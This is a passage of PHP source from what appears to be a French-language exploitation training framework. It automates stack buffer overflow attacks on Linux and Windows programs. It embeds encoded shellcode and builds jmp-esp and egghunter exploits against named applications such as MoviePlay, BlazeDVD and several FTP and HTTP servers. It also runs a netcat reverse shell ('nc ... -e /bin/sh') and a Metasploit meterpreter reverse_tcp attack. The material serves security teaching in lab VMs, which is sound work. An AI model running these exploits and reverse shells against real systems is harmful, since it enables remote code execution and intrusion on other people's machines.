	    $exploit_size_max = 2600;
	    $dll = "all";
	    $header = "";
	    $footer = "";
	    $file_bin->ret2stack4linux4jmp2esp4sc_after_only($offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max); // pause(); // ok
	    ###########################################################################
	    
	    exit();
	    
	    ##################### BOCHS 2.6.5 #############################################
	    // No ;
	    $binary = "$this->dir_tmp/ekg";
	    if (!file_exists($binary)) $this->install_bof_stack4linux_ekg();
	    $file_bin = new ret2stack4linux($binary);
	    $file_bin->elf2info();$this->pause();
	    //$overflow = 8200;
	    //$offset_eip = 8150;
	    $overflow = $file_bin->elf2fuzzeling("","");
	    $offset_eip = $file_bin->elf2offset4eip("",$overflow,"");
	    $this->pause();
	    $this->article("shellcode date with metasploit", "msfvenom --payload linux/x86/exec cmd=\"date\" --arch x86 --platform linux --encoder x86/shikata_ga_nai --iterations 1 --bad-chars \"\\x00\\x20\\x0a\" --format c");
	    $shellcode = '\xb8\x8b\x5c\xe1\xb0\xd9\xc2\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x0b\x83\xeb\xfc\x31\x43\x0e\x03\xc8\x52\x03\x45\xa4\x61\x9b\x3f\x6a\x10\x73\x6d\xe9\x55\x64\x05\xc2\x16\x03\xd6\x74\xf6\xb1\xbf\xea\x81\xd5\x12\x1a\x94\x19\x93\xda\xf3\x78\xe7\xbf\xfb\x2d\x54\xb6\x1d\x1c\xda';
	    $this->article("shellcode date()", $shellcode);
	    $this->pause();
	    
	    $exploit_size_max = 2600;
	    $dll = "all";
	    $header = "";
	    $footer = "";
	    $file_bin->ret2stack4linux4jmp2esp4sc_after_only($offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max); // pause(); // ok
	    ###########################################################################
	    
	    exit();
	    ##################### BOCHS 2.6.5 #############################################
	    // No ;
	    $binary = "$this->dir_tmp/iselect";
	    if (!file_exists($binary)) $this->install_bof_stack4linux_iselect1402();
	    $file_bin = new ret2stack4linux($binary);
	    $file_bin->elf2info();$this->pause();
	    //$overflow = 8200;
	    //$offset_eip = 8150;
	    $overflow = $file_bin->elf2fuzzeling("--key","");
	    $offset_eip = $file_bin->elf2offset4eip("",$overflow,"");
	    $this->pause();
	    $this->article("shellcode date with metasploit", "msfvenom --payload linux/x86/exec cmd=\"date\" --arch x86 --platform linux --encoder x86/shikata_ga_nai --iterations 1 --bad-chars \"\\x00\\x20\\x0a\" --format c");
	    $shellcode = '\xb8\x8b\x5c\xe1\xb0\xd9\xc2\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x0b\x83\xeb\xfc\x31\x43\x0e\x03\xc8\x52\x03\x45\xa4\x61\x9b\x3f\x6a\x10\x73\x6d\xe9\x55\x64\x05\xc2\x16\x03\xd6\x74\xf6\xb1\xbf\xea\x81\xd5\x12\x1a\x94\x19\x93\xda\xf3\x78\xe7\xbf\xfb\x2d\x54\xb6\x1d\x1c\xda';
	    $this->article("shellcode date()", $shellcode);
	    $this->pause();
	    
	    $exploit_size_max = 2600;
	    $dll = "all";
	    $header = "";
	    $footer = "";
	    $file_bin->ret2stack4linux4jmp2esp4sc_after_only($offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max); // pause(); // ok
	    ###########################################################################
	    
	    exit();
	    
	    ##################### BOCHS 2.6.5 #############################################
	    // No ;
	    $binary = "$this->dir_tmp/jad";
	    if (!file_exists($binary)) $this->install_bof_stack4linux_jad();
	    $file_bin = new ret2stack4linux($binary);
	    $file_bin->elf2info();$this->pause();
	    $overflow = 8200;
	    $offset_eip = 8150;
	    //$overflow = $file_bin->elf2fuzzeling("","");
	    //$offset_eip = $file_bin->elf2offset4eip("",$overflow,"");
	    $this->pause();
	    $this->article("shellcode date with metasploit", "msfvenom --payload linux/x86/exec cmd=\"date\" --arch x86 --platform linux --encoder x86/shikata_ga_nai --iterations 1 --bad-chars \"\\x00\\x20\\x0a\" --format c");
	    $shellcode = '\xb8\x8b\x5c\xe1\xb0\xd9\xc2\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x0b\x83\xeb\xfc\x31\x43\x0e\x03\xc8\x52\x03\x45\xa4\x61\x9b\x3f\x6a\x10\x73\x6d\xe9\x55\x64\x05\xc2\x16\x03\xd6\x74\xf6\xb1\xbf\xea\x81\xd5\x12\x1a\x94\x19\x93\xda\xf3\x78\xe7\xbf\xfb\x2d\x54\xb6\x1d\x1c\xda';
	    $this->article("shellcode date()", $shellcode);
	    $this->pause();
	    
	    $exploit_size_max = 8600;
	    $dll = "all";
	    $header = "";
	    $footer = "";
	    $file_bin->ret2stack4linux4jmp2esp4sc_after_only($offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max); // pause(); // ok
	    ###########################################################################
	    
	    exit();
	    
	    ##################### BOCHS 2.6.5 #############################################
	    // No ;
	    $binary = "$this->dir_tmp/fasm-1.71.21/fasm";
	    if (!file_exists($binary)) $this->install_bof_stack4linux_fasm17121();
	    $file_bin = new ret2stack4linux($binary);
	    $file_bin->elf2info();$this->pause();
	    //$overflow = 1038;
	    //$offset_eip = 80;
	    $overflow = $file_bin->elf2fuzzeling("","");
	    $offset_eip = $file_bin->elf2offset4eip("",$overflow,"");
	    $this->pause();
	    $this->article("shellcode date with metasploit", "msfvenom --payload linux/x86/exec cmd=\"date\" --arch x86 --platform linux --encoder x86/shikata_ga_nai --iterations 1 --bad-chars \"\\x00\\x20\\x0a\" --format c");
	    $shellcode = '\xb8\x8b\x5c\xe1\xb0\xd9\xc2\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x0b\x83\xeb\xfc\x31\x43\x0e\x03\xc8\x52\x03\x45\xa4\x61\x9b\x3f\x6a\x10\x73\x6d\xe9\x55\x64\x05\xc2\x16\x03\xd6\x74\xf6\xb1\xbf\xea\x81\xd5\x12\x1a\x94\x19\x93\xda\xf3\x78\xe7\xbf\xfb\x2d\x54\xb6\x1d\x1c\xda';
	    $this->article("shellcode date()", $shellcode);
	    $this->pause();
	    
	    $exploit_size_max = 2600;
	    $dll = "all";
	    $header = "";
	    $footer = "";
	    $file_bin->ret2stack4linux4jmp2esp4sc_after_only($offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max); // pause(); // ok
	    ###########################################################################
	    
	    exit();
	    
	    ##################### BOCHS 2.6.5 #############################################
	    // No ;
	    $binary = "$this->dir_tmp/mawk-1.3.3/mawk";
	    if (!file_exists($binary)) $this->install_bof_stack4linux_mawk133();
	    $file_bin = new ret2stack4linux($binary);
	    $file_bin->elf2info();$this->pause();
	    //$overflow = 1038;
	    //$offset_eip = 80;
	    $overflow = $file_bin->elf2fuzzeling("","");
	    $offset_eip = $file_bin->elf2offset4eip("",$overflow,"");
	    $this->pause();
	    $this->article("shellcode date with metasploit", "msfvenom --payload linux/x86/exec cmd=\"date\" --arch x86 --platform linux --encoder x86/shikata_ga_nai --iterations 1 --bad-chars \"\\x00\\x20\\x0a\" --format c");
	    $shellcode = '\xb8\x8b\x5c\xe1\xb0\xd9\xc2\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x0b\x83\xeb\xfc\x31\x43\x0e\x03\xc8\x52\x03\x45\xa4\x61\x9b\x3f\x6a\x10\x73\x6d\xe9\x55\x64\x05\xc2\x16\x03\xd6\x74\xf6\xb1\xbf\xea\x81\xd5\x12\x1a\x94\x19\x93\xda\xf3\x78\xe7\xbf\xfb\x2d\x54\xb6\x1d\x1c\xda';
	    $this->article("shellcode date()", $shellcode);
	    $this->pause();
	    
	    $exploit_size_max = 2600;
	    $dll = "all";
	    $header = "";
	    $footer = "";
	    $file_bin->ret2stack4linux4jmp2esp4sc_after_only($offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max); // pause(); // ok
	    ###########################################################################
	    
	    exit();
	    
	    ##################### BOCHS 2.6.5 #############################################
	    // No ;
	    $binary = "$this->dir_tmp/dnstracer-1.9/dnstracer";
	    if (!file_exists($binary)) $this->install_bof_stack4linux_dnstracer19();
	    $file_bin = new ret2stack4linux($binary);
	    $file_bin->elf2info();$this->pause();
	    //$overflow = 2000;
	    //$offset_eip = 80;
	    $overflow = $file_bin->elf2fuzzeling("","");
	    $offset_eip = $file_bin->elf2offset4eip("",$overflow,"");
	    $this->pause();
	    $this->article("shellcode date with metasploit", "msfvenom --payload linux/x86/exec cmd=\"date\" --arch x86 --platform linux --encoder x86/shikata_ga_nai --iterations 1 --bad-chars \"\\x00\\x20\\x0a\" --format c");
	    $shellcode = '\xb8\x8b\x5c\xe1\xb0\xd9\xc2\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x0b\x83\xeb\xfc\x31\x43\x0e\x03\xc8\x52\x03\x45\xa4\x61\x9b\x3f\x6a\x10\x73\x6d\xe9\x55\x64\x05\xc2\x16\x03\xd6\x74\xf6\xb1\xbf\xea\x81\xd5\x12\x1a\x94\x19\x93\xda\xf3\x78\xe7\xbf\xfb\x2d\x54\xb6\x1d\x1c\xda';
	    $this->article("shellcode date()", $shellcode);
	    $this->pause();
	    
	    $exploit_size_max = 2600;
	    $dll = "all";
	    $header = "";
	    $footer = "";
	    $file_bin->ret2stack4linux4jmp2esp4sc_after_only($offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max); // pause(); // ok
	    ###########################################################################
	    
	    exit();
	    
	    ##################### BOCHS 2.6.5 #############################################
	    // No ; 
	    $binary = "$this->dir_tmp/bochs-2.6.5/bochs";
	    if (!file_exists($binary)) $this->install_bof_stack4linux_bochs265();
	    $file_bin = new ret2stack4linux($binary);
	    $file_bin->elf2info();$this->pause();
	    //$overflow = 2000;
	    //$offset_eip = 80;
	    $overflow = $file_bin->elf2fuzzeling("","");
	    $offset_eip = $file_bin->elf2offset4eip("",$overflow,"");
	    $this->pause();
	    $this->article("shellcode date with metasploit", "msfvenom --payload linux/x86/exec cmd=\"date\" --arch x86 --platform linux --encoder x86/shikata_ga_nai --iterations 1 --bad-chars \"\\x00\\x20\\x0a\" --format c");
	    $shellcode = '\xb8\x8b\x5c\xe1\xb0\xd9\xc2\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x0b\x83\xeb\xfc\x31\x43\x0e\x03\xc8\x52\x03\x45\xa4\x61\x9b\x3f\x6a\x10\x73\x6d\xe9\x55\x64\x05\xc2\x16\x03\xd6\x74\xf6\xb1\xbf\xea\x81\xd5\x12\x1a\x94\x19\x93\xda\xf3\x78\xe7\xbf\xfb\x2d\x54\xb6\x1d\x1c\xda';
	    $this->article("shellcode date()", $shellcode);
	    $this->pause();
	    
	    $exploit_size_max = 2600;
	    $dll = "all";
	    $header = "";
	    $footer = "";
	    $file_bin->ret2stack4linux4jmp2esp4sc_after_only($offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max); // pause(); // ok
	    ###########################################################################
	    
	    exit();
	    
	    ##################### SIPP #############################################
	    // No ; sipp[12877]: segfault at 58585864 ip
	    $binary = "$this->dir_tmp/sipp-3.3/sipp";	    
	    if (!file_exists($binary)) $this->install_bof_stack4linux_sipp33();
	    $file_bin = new ret2stack4linux($binary);
	    $file_bin->elf2info();$this->pause();
	    $overflow = 2000;
	    //$offset_eip = 80;
	    $overflow = $file_bin->elf2fuzzeling("","");
	    $offset_eip = $file_bin->elf2offset4eip("",$overflow,"");
	    $this->pause();
	    $this->article("shellcode date with metasploit", "msfvenom --payload linux/x86/exec cmd=\"date\" --arch x86 --platform linux --encoder x86/shikata_ga_nai --iterations 1 --bad-chars \"\\x00\\x20\\x0a\" --format c");
	    $shellcode = '\xb8\x8b\x5c\xe1\xb0\xd9\xc2\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x0b\x83\xeb\xfc\x31\x43\x0e\x03\xc8\x52\x03\x45\xa4\x61\x9b\x3f\x6a\x10\x73\x6d\xe9\x55\x64\x05\xc2\x16\x03\xd6\x74\xf6\xb1\xbf\xea\x81\xd5\x12\x1a\x94\x19\x93\xda\xf3\x78\xe7\xbf\xfb\x2d\x54\xb6\x1d\x1c\xda';
	    $this->article("shellcode date()", $shellcode);
	    $this->pause();
	    
	    $exploit_size_max = 2600;
	    $dll = "all";
	    $header = "";
	    $footer = "";
	    $file_bin->ret2stack4linux4jmp2esp4sc_after_only($offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max); // pause(); // ok
	    ###########################################################################
	    
	    exit();
	    ##################### WIFIRX #############################################
	    // OK
	    $binary = "$this->dir_tmp/wifirxpower/wifirx.elf";
	    $file_bin = new ret2stack4linux($binary);
	    if (!file_exists($binary)) $file_bin->install_bof_stack4linux_wifirx();	    
	    $file_bin->elf2info();$this->pause();	    
	    $overflow = 244;
	    //$offset_eip = 80;
	    //$overflow = $file_bin->elf2fuzzeling("","");
	    $offset_eip = $file_bin->elf2offset4eip("",$overflow,"");
	    $this->pause();
	    $this->article("shellcode date with metasploit", "msfvenom --payload linux/x86/exec cmd=\"date\" --arch x86 --platform linux --encoder x86/shikata_ga_nai --iterations 1 --bad-chars \"\\x00\\x20\\x0a\" --format c");
	    $shellcode = '\xb8\x8b\x5c\xe1\xb0\xd9\xc2\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x0b\x83\xeb\xfc\x31\x43\x0e\x03\xc8\x52\x03\x45\xa4\x61\x9b\x3f\x6a\x10\x73\x6d\xe9\x55\x64\x05\xc2\x16\x03\xd6\x74\xf6\xb1\xbf\xea\x81\xd5\x12\x1a\x94\x19\x93\xda\xf3\x78\xe7\xbf\xfb\x2d\x54\xb6\x1d\x1c\xda';
	    $this->article("shellcode date()", $shellcode);
	    $this->pause();
	    
	    $exploit_size_max = 1300;
	    $dll = "all";
	    $header = "";
	    $footer = "";
	    $file_bin->ret2stack4linux4jmp2esp4sc_after_only($offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max); // pause(); // ok
	    ###########################################################################
	    
	    
	    
	
	}
	
	public function poc4bof2ret2stack4linux_after(){
	    $this->chapitre("SHELLCODE AFTER EIP");
	    
	    
	    $name = "ret2stack32la";
	    system("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
	    $bin = new file("$this->dir_tmp/$name.c");
	    $ret2stack32la = $bin->file_c2elf("-ggdb -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
	    
	    $file_bin = new ret2stack4linux($ret2stack32la);
	    
	    $overflow = $file_bin->elf2fuzzeling("","");
	    $offset_eip = $file_bin->elf2offset4eip("",$overflow,"");
	    //$overflow = 2044;
	    //$offset_eip = 524;
	    $this->pause();
	    $attacker_ip = "127.0.0.1";
	    $attacker_port = 9999;
	    //$cmd2 = "cat $file_bin->file_dir/$file_bin->file_name.addr.tmp ";
	    //$shellcode = $file_bin->elf4shellcode($cmd2,'\x00\x20\x0a')->file_h2hex()->file_file2strings("");
	    $shellcode = $file_bin->shellcode_date_linux ;	    
	    $this->article("shellcode", $shellcode);
	    $this->pause();
	    
	    $exploit_size_max = 2048;
	    $dll = "all";
	    $header = "";
	    $footer = "";
	    
	    echo $this->map(4); // pause();
	    $file_bin->ret2stack4linux_all($offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max); // pause(); // ok
	}
	
	
	
	function poc4bof2ret2stack4linux_env_aslr_no() {
	    $this->chapitre("SHELLCODE in Env");
	    
	    $this->img("$this->dir_img/bof/env.jpg");
	    $this->img("$this->dir_img/bof/env2.jpg");
	    $this->requette("cp -v $this->dir_c/argv.c $this->dir_tmp/argv.c");
	    $bin = new file("$this->dir_tmp/argv.c");
	    $var_env = $bin->file_c2elf("");
	    $bin->requette($var_env);
	    
	    $name = "ret2stack32le";
	    
	    system("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
	    $bin = new file("$this->dir_tmp/$name.c");
	    $ret2stack32le = $bin->file_c2elf("-ggdb -fno-stack-protector  -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
	    
	    $file_bin = new ret2stack4linux($ret2stack32le);
	    
	    $overflow = $file_bin->elf2fuzzeling("","");
	    $offset_eip = $file_bin->elf2offset4eip("",$overflow,"");
	    
	    $this->ssTitre("SHELLCODE ENV NO ASLR");
	    echo $this->map(0);$this->pause();
	    $this->os2aslr4no();	$this->pause();
	    $shellcode_hex = $file_bin->shellcode_date_linux;
	    $file_bin->shellcode2env4hex(0, $shellcode_hex);
	    $file_bin->dot4payload_eip_jmp2env();
	    $addr_ret = $file_bin->elf2addr4env("shellcode");
	    $query = $file_bin->ret2stack4linux4env_no_aslr($offset_eip, $addr_ret);
	    $this->requette($query);
	    $this->pause();

 
	    $attacker_ip = "127.0.0.1";
	    $attacker_port = 31337 ;
	    $attacker_protocol = "T";
	    $shell = "/bin/sh";
	    $time = 3 ;
	    $info = __FUNCTION__.":$file_bin->file_path";
	    $cmd1 = "php pentest.php LAN \"'lo' 'localhost.local' '$attacker_ip' '$attacker_port' 'T' '$attacker_port' '$attacker_protocol' '$info' 'server' '100' \"";
	    $this->article("CMD1", $cmd1);
	    $cmd2 = "nc $attacker_ip $attacker_port -e $shell";
	    $this->article("CMD2", $cmd2);
	    $this->cmd("localhost",$cmd2);
	    $file_bin->elf4shellcode($cmd2,'\x00\x20\x0a')->file_h2hex()->file_shellcode2env(0);
	    $addr_ret = $file_bin->elf2addr4env("shellcode");
	    $cmd2 = $file_bin->ret2stack4linux4env_no_aslr($offset_eip, $addr_ret);
	    $file_bin->elf2lan($attacker_ip, $attacker_port, $shell, $time, $info, $cmd2);

	    
	}
	
	function poc4bof2ret2stack4linux_env_aslr_yes() {
	    $this->chapitre("SHELLCODE in Env");
	    $this->note("le plus petit shellcode fait 8 Octets");
	    $this->question("si on avait une buffer de taille < 8 Octets notre bof_before ne sera pas exploitable");
	    $this->pause();
	    
	    
	    $name = "ret2stack32le";
	    system("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
	    $bin = new file("$this->dir_tmp/$name.c");
	    $ret2stack32le = $bin->file_c2elf("-ggdb -fno-stack-protector  -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
	    
	    $file_bin = new ret2stack4linux($ret2stack32le);
	    
	    $overflow = $file_bin->elf2fuzzeling("","");
	    $offset_eip = $file_bin->elf2offset4eip("",$overflow,"");
	    $this->pause();

	    $this->titre("SHELLCODE ENV WITH ASLR");
	    echo $this->map(1);$this->pause();
	    $this->os2aslr4yes();$this->pause();
	    $this->titre("Test with 4.000 Nops");
	    $file_bin->elf4shellcode("/bin/sh",'\x00\x20\x0a')->file_h2hex()->file_shellcode2env(4000);
	    $addr_ret = $file_bin->elf2addr4env("shellcode");
	    $file_bin->ret2stack4linux4env_with_aslr($offset_eip, $addr_ret);
	    $this->pause();
	}
	
	
	function poc4bof2ret2stack4win() {
	    

	    
	    $this->img("$this->dir_img/bof/stack_windows.png");
	    $vmx = "xp3";
	    

	    $this->cmd("localhost", "nc $this->xp3 4444 -v"); // pause();
	     
	     $vm_xp3 = new vm($vmx);
	    // $vm_xp3->vm2upload("$this->dir_c/ret2stack32wa.c","$this->vm_tmp_win\\ret2stack32wa.c");
	    // $this->cmd("$this->xp3","gcc /tmp/ret2stack32wa.c -o /tmp/ret2stack32wa -w -ggdb -fno-pie -z norelro -z execstack -ggdb -fno-stack-protector  -m32 -mtune=i386 -static ");$this->pause();
	    // $vm_xp3->vm2download("$this->vm_tmp_win\\ret2stack32wa.exe", "$this->dir_tmp/ret2stack32wa.exe");$this->pause();
	    // $file_bin = new ret2stack4win("$this->dir_tmp/ret2stack32wa");
	     
	    
	    $rep_bof = "$this->dir_install/Win/Bof.zip";
	   // $vm_xp3->vm2upload($rep_bof,"$this->vm_tmp_win\\Bof.zip");
	    $rep_path = "$this->dir_tmp/ret2stack4win";
	    if (!is_dir($rep_path)) $this->create_folder($rep_path);
	    
	    // OK 144 bits calc.exe
	    $shellcode_win_calc = '\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05\x7f\xe8\x7b\xca';
	    $shellcode = $shellcode_win_calc;
	    
	    
	    
	    $programme = "MoviePlay.exe";
	    $file_bin = new ret2stack4win($programme);
	    $this->net("https://www.exploit-db.com/exploits/16153/");
	    
	    // OK
	    $file_bin->ret2stack4win4jmp2esp4sc_after_only($rep_path,$vmx,"MoviePlay.exe", 1085, "shell32.dll", '\x5b\x4d\x6f\x76\x69\x65\x50\x6c\x61\x79\x5d\x0d\x0a\x46\x69\x6c\x65\x4e\x61\x6d\x65\x30\x3d\x43\x3a\x5c', $shellcode, '\x2e\x6d\x70\x33\x0d\x0a\x46\x69\x6c\x65\x4e\x61\x6d\x65\x31\x3d\x0d\x0a\x4e\x75\x6d\x46\x69\x6c\x65\x73\x3d\x31\x0d\x0a', 2000,"lst");
	    $file_bin->ret2stack4win4jmp2esp4sc_after_egghunter($rep_path,$vmx,"MoviePlay.exe", 1085, "shell32.dll", '\x5b\x4d\x6f\x76\x69\x65\x50\x6c\x61\x79\x5d\x0d\x0a\x46\x69\x6c\x65\x4e\x61\x6d\x65\x30\x3d\x43\x3a\x5c', $shellcode, '\x2e\x6d\x70\x33\x0d\x0a\x46\x69\x6c\x65\x4e\x61\x6d\x65\x31\x3d\x0d\x0a\x4e\x75\x6d\x46\x69\x6c\x65\x73\x3d\x31\x0d\x0a', 2000,"lst");
	    $file_bin->ret2stack4win4jmp2esp4sc_before_egghunter($rep_path,$vmx,"MoviePlay.exe", 1085, "shell32.dll", '\x5b\x4d\x6f\x76\x69\x65\x50\x6c\x61\x79\x5d\x0d\x0a\x46\x69\x6c\x65\x4e\x61\x6d\x65\x30\x3d\x43\x3a\x5c', $shellcode, '\x2e\x6d\x70\x33\x0d\x0a\x46\x69\x6c\x65\x4e\x61\x6d\x65\x31\x3d\x0d\x0a\x4e\x75\x6d\x46\x69\x6c\x65\x73\x3d\x31\x0d\x0a', 2000,"lst");
	    $this->pause();
	    
	    // OK
	    $programme = "FlashCards.exe";
	    $file_bin = new ret2stack4win($programme);
	    $this->net("https://www.exploit-db.com/exploits/16977/");
	    $file_bin->ret2stack4win4jmp2esp4sc_before_jmpback($rep_path,$vmx,"FlashCards.exe", 4108, "kernel32.dll", '', $shellcode, '', 4124,"fcd");
	    $this->article("PoC","Go to TEST and click to Random and start Test");
	    $this->pause();
	    
	    
	    
	    // OK
	    $programme = "BlazeDVD.exe";
	    $file_bin = new ret2stack4win($programme);
	    $this->net("https://www.exploit-db.com/exploits/26889/");
	    $file_bin->ret2stack4win4jmp2esp4sc_after_only($rep_path,$vmx,"BlazeDVD.exe", 260, "shell32.dll", '', $shellcode, '', 440,"plf");
	    $this->pause();
	    
	    // OK
	    $programme = "Wmpcon.exe";
	    $file_bin = new ret2stack4win($programme);
	    $this->net("https://www.exploit-db.com/exploits/35074/");
	    $file_bin->ret2stack4win4jmp2esp4sc_after_only($rep_path,$vmx,"Wmpcon.exe", 4112, "shell32.dll", '', $shellcode, '', 4265,"wav");
	    $this->pause();
	    
	    // OK
	    $programme = "WmDownloader.exe";
	    $file_bin = new ret2stack4win($programme);
	    $this->net("https://www.exploit-db.com/exploits/14527/");
	    $file_bin->ret2stack4win4jmp2esp4sc_after_only($rep_path,$vmx,"WmDownloader.exe", 17417, "shell32.dll", '\x68\x74\x74\x70\x3a\x2f\x2f', $shellcode, '', 18000,"m3u");
	    $this->pause();
	    
	    // OK
	    $programme = "mediacoder.exe";
	    $file_bin = new ret2stack4win($programme);
	    $this->net("https://www.exploit-db.com/exploits/17012/");
	    $file_bin->ret2stack4win4jmp2esp4sc_after_only($rep_path,$vmx,"mediacoder.exe", 256, "shell32.dll", '', $shellcode, '', 600,"m3u");
	    $this->pause();
	    
	    
	    
	    // OK
	    $programme = "AviosoftDTV.exe";
	    $file_bin = new ret2stack4win($programme);
	    $this->net("http://www.exploit-db.com/exploits/18096/");
	    $file_bin->ret2stack4win4jmp2esp4sc_after_only($rep_path,$vmx,"AviosoftDTV.exe", 253, "ntdll.dll", '\x68\x74\x74\x70\x3a\x2f\x2f', $shellcode, '', 1000,"plf");
	    $this->pause();
	    
	    // OK
	    $programme = "Coolplayer.exe"; // refaire
	    $file_bin = new ret2stack4win($programme);
	    $this->net("http://www.exploit-db.com/exploits/4839/");
	    $file_bin->ret2stack4win4jmp2reg($rep_path,$vmx,"ebx",  253, "shell32.dll", "", $shellcode, "", 500,"m3u");
	    $this->pause();
	    
	    // OK FTP SERVER
	    $programme = "FTPServer.exe";
	    $file_bin = new ret2stack4win($programme);
	    $this->net("https://www.exploit-db.com/exploits/23243/");
	    $file_bin->ret2stack4win4jmp2esp4sc_after_only($rep_path,$vmx,"FTPServer.exe", 230, "ntdll.dll", "", $shellcode, '\x0a', 1000,"cmd");
	    $this->requette("echo \"USER `cat $rep_path/exploit_FTPServer.exe_jmp_esp_sc_after_only_0x7c929db0.cmd`\" | nc $this->xp3 21 -v ");
	    $this->pause();
	    
	    // OK FTP SERVER
	    $programme = "knftpd.exe";
	    $file_bin = new ret2stack4win($programme);
	    $this->net("https://www.exploit-db.com/exploits/17870/");
	    $file_bin->ret2stack4win4jmp2esp4sc_before_egghunter($rep_path,$vmx,"knftpd.exe", 284, "ntdll.dll", '\x55\x53\x45\x52\x20', $shellcode, '\x0d\x0a', 342,"cmd");
	    $this->requette("nc $this->xp3 21 -v -q 1 < $rep_path/exploit_ret2stack4win_knftpd.exe_jmp_esp_sc_before_egghunter_0x7c929db0.cmd");
	    $this->pause();
	    
	    // OK HTTP Server
	    $programme = "sws.exe";
	    $file_bin = new ret2stack4win($programme);
	    $this->net("https://www.exploit-db.com/exploits/19937/");
	    $file_bin->ret2stack4win4jmp2esp4sc_before_egghunter($rep_path,$vmx,"sws.exe", 2048, "ntdll.dll", '\x47\x45\x54\x20\x2f\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x5c\x72\x5c\x6e\x0a\x48\x6f\x73\x74\x3a\x20\x31\x30\x2e\x32\x30\x2e\x31\x30\x2e\x31\x32\x38\x20\x5c\x72\x5c\x6e\x0a\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x3a', $shellcode, '\x6e\x0a\x6e\x0a', 2162,"cmd");
	    $this->requette("nc $this->xp3 80 -v -q 1 < $rep_path/exploit_ret2stack4win_sws.exe_jmp_esp_sc_before_egghunter_0x7c929db0.cmd");
	    $this->pause();
	    
	    
	    $this->ssTitre("Even software from blackhat" );
	    $this->article("PoisonIvy 2.3.2","UnrealIRCD 3.2.8.1 Backdoor Command Execution");
	    $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S msfconsole -q -x \"use exploit/windows/misc/poisonivy_bof;\
		set PAYLOAD windows/meterpreter/reverse_tcp;\
		set LHOST $this->prof;\
		set LPORT 5552;\
		set RHOST $this->xp3 ;\
		set target 2;
		run;\" ");
	    $this->pause();
	    
	    $this->img("$this->dir_img/bof/stack_windows.png");
	    $this->img("$this->dir_img/bof/ASLR_windows.png");
	    $this->todo("Activation de ASLR sous windows -> Vista -> tester les applications");
	    $this->article("ASLR","l’ASLR (Address Space Layout Randomization) introduit sur les OS de Microsoft depuis la sortie de vista.");
	    $this->pause();
	    
	    $this->chapitre("TP");
	    $this->article("TP:","Find last one-day exploit for stack buffer overflow on exploit-db.com and make some exploits");
	    $this->net("https://www.exploit-db.com/exploits/");
	    $this->net("https://www.exploit-db.com/exploits/39662/");
	    $this->net("https://www.exploit-db.com/exploits/39480/");
	    $this->net("https://www.exploit-db.com/exploits/39417/");
	    $this->net("https://www.exploit-db.com/exploits/39443/");
	    $this->net("https://www.exploit-db.com/exploits/39285/");
	    $this->net("https://www.exploit-db.com/exploits/38609/");
	    $this->pause();
	    $this->article("MORE EXEMPLE","make only one exploit from one technical attack ");
	    $programme = "MoviePlay.exe";
	    $file_bin = new ret2stack4win($programme);
	    $this->net("https://www.exploit-db.com/exploits/16153/");
	    $file_bin->ret2stack4win4jmp2esp4sc_after_only($rep_path,$vmx,"MoviePlay.exe", 1085, "shell32.dll", '\x5b\x4d\x6f\x76\x69\x65\x50\x6c\x61\x79\x5d\x0d\x0a\x46\x69\x6c\x65\x4e\x61\x6d\x65\x30\x3d\x43\x3a\x5c', $shellcode, '\x2e\x6d\x70\x33\x0d\x0a\x46\x69\x6c\x65\x4e\x61\x6d\x65\x31\x3d\x0d\x0a\x4e\x75\x6d\x46\x69\x6c\x65\x73\x3d\x31\x0d\x0a', 2000,"lst");
	    $this->pause();
	    
	    /*
	     //test_TP:
	     
	     // MSF windows/shell_bind_tcp LPORT=4444
